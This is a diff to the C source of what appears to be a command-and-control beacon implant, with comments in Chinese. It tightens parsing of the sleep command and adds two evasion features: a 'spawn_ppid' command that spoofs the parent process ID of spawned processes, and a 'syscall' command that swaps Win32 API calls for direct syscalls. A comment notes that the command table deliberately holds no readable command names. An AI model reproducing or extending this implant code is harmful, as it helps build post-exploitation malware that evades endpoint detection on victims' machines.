@@ -1,5 +1,6 @@
 #include "beacon_commands.h"
 #include "beacon_cascade.h"
+#include "beacon_spawn.h"
 
 /*
  * 命令分发中心：
@@ -38,14 +39,27 @@ static PacketList HandleSleep(BeaconContext* ctx, UINT32 task_id,
                               UINT32 command_id, Parser* p)
 {
     ByteBuf msg;
+    UINT32 count;
+    UINT32 sleep_ms;
     (VOID)task_id;
     (VOID)command_id;
 
-    if (ParserU32(p) == 0) {
+    /* wire 格式与 spawn_ppid 一致：packCountedInt32Args -> [count][sleep_ms][jitter?]。
+     * 区分"参数缺失/截断"（解析错误）与"显式 0"（非法值）：旧实现遇到截断包会落到
+     * sleep_ms=0，使 beacon 进入 0ms 忙轮询；UINT32→INT 直接强转还会产生负值。 */
+    count = ParserU32(p);
+    if (p->error[0] || count == 0) {
         return CommandSingle(BbFromText("sleep requires at least 1 argument"));
     }
+    sleep_ms = ParserU32(p);
+    if (p->error[0]) {
+        return CommandSingle(BbFromText("sleep interval parse failed"));
+    }
+    if (sleep_ms == 0 || sleep_ms > (UINT32)0x7FFFFFFF) {
+        return CommandSingle(BbFromText("sleep interval must be 1..2147483647 ms"));
+    }
 
-    ctx->profile.sleep_ms = (INT)ParserU32(p);
+    ctx->profile.sleep_ms = (INT)sleep_ms;
     if (ParserLeft(p) >= 4) ctx->profile.jitter = (INT)ParserU32(p);
 
     BbInit(&msg);
@@ -366,6 +380,75 @@ static PacketList HandleMigrate(BeaconContext* ctx, UINT32 task_id,
     return CommandSingle(MigrateHandle(ctx, task_id, p));
 }
 
+/* spawn_ppid [pid]：设置/查询全局 PPID 欺骗目标（0 = 关闭欺骗）。
+ * wire 格式与 sleep 一致：packCountedInt32Args -> [count][pid...]；
+ * count=0 时查询当前值。 */
+static PacketList HandleSpawnPpid(BeaconContext* ctx, UINT32 task_id,
+                                  UINT32 command_id, Parser* p)
+{
+    ByteBuf msg;
+    UINT32 count;
+    (VOID)ctx;
+    (VOID)task_id;
+    (VOID)command_id;
+
+    BbInit(&msg);
+    count = ParserU32(p);
+    if (count >= 1) {
+        UINT32 pid = ParserU32(p);
+        if (p->error[0]) {
+            return CommandSingle(BbFromText(p->error));
+        }
+        SpawnSetPpid(pid);
+        BbPrintf(&msg, "spawn_ppid set: %lu%s", (ULONG)pid,
+                 pid ? "" : " (ppid spoofing disabled)");
+    } else {
+        UINT32 current = SpawnGetPpid();
+        BbPrintf(&msg, "spawn_ppid = %lu%s", (ULONG)current,
+                 current ? "" : " (ppid spoofing disabled)");
+    }
+    return CommandSingle(msg);
+}
+
+/* syscall <on|off>：运行时切换 syscall（覆盖/恢复 Win32Api 槽位）。
+ * wire 格式：packCountedStringArgs -> [count]["on"/"off"]；count=0 时查询。 */
+static PacketList HandleSyscall(BeaconContext* ctx, UINT32 task_id,
+                                UINT32 command_id, Parser* p)
+{
+    ByteBuf msg;
+    UINT32 count;
+    (VOID)task_id;
+    (VOID)command_id;
+
+    count = ParserU32(p);
+    if (count >= 1) {
+        CHAR* arg;
+        CHAR errbuf[160];
+
+        if (p->error[0]) {
+            /* 协议截断：区分于合法的 count=0 查询路径 */
+            snprintf(errbuf, sizeof(errbuf), "syscall: %s", p->error);
+            return CommandSingle(BbFromText(errbuf));
+        }
+        arg = ParserString(p);
+        if (arg) {
+            if (_stricmp(arg, "on") == 0) {
+                SyscallSetEnabled(&ctx->syscall, &ctx->api, TRUE);
+            } else if (_stricmp(arg, "off") == 0) {
+                SyscallSetEnabled(&ctx->syscall, &ctx->api, FALSE);
+            } else {
+                HeapFree(GetProcessHeap(), 0, arg);
+                return CommandSingle(BbFromText("syscall requires 'on' or 'off'"));
+            }
+            HeapFree(GetProcessHeap(), 0, arg);
+        }
+    }
+
+    BbInit(&msg);
+    BbPrintf(&msg, "syscall %s", ctx->syscall.bound ? "enabled" : "disabled");
+    return CommandSingle(msg);
+}
+
 /*
  * 命令注册表：只保存 command id 和函数指针，不携带可读命令名。
  * 未注册的 CASCADE_OPEN/READ/DEAD/PING 与 POSTEX_EVENT 是出站或内部事件 ID，
@@ -408,7 +491,9 @@ static const CommandEntry g_commands[] = {
     { BEACON_COMMAND_CASCADE_ROUTE,       HandleCascadeRoute },
     { BEACON_COMMAND_CASCADE_CLOSE,       HandleCascadeClose },
     { BEACON_COMMAND_POSTEX,              HandlePostEx },
-    { BEACON_COMMAND_MIGRATE,             HandleMigrate }
+    { BEACON_COMMAND_MIGRATE,             HandleMigrate },
+    { BEACON_COMMAND_SPAWN_PPID,          HandleSpawnPpid },
+    { BEACON_COMMAND_SYSCALL,             HandleSyscall }
 };
 
 /* 按 command id 在线性静态表中查找 handler。 */
